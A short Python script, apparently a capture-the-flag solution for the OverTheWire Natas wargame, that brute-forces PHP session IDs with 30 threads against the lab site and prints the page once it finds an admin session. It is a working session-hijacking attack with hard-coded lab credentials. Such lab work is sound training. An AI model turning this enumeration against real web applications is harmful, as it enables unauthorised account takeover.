#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#


"""
Natas 19 Solution
"""
import logging
import sys

import concurrent.futures
import requests

logging.basicConfig(level=logging.INFO, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def get_page_text(session_num):
    """
    View Source
    """
    logger.debug(session_num)
    r = requests.get(
        "http://natas18.natas.labs.overthewire.org",
        auth=("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"),
        cookies={"PHPSESSID": str(session_num)})
    if "You are an admin." in r.text:
        logger.info("Admin session: %d", session_num)
        print(r.text)


def main():
    """
    Looping through SessionID
    """
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(get_page_text, range(640))


if __name__ == "__main__":
    main()
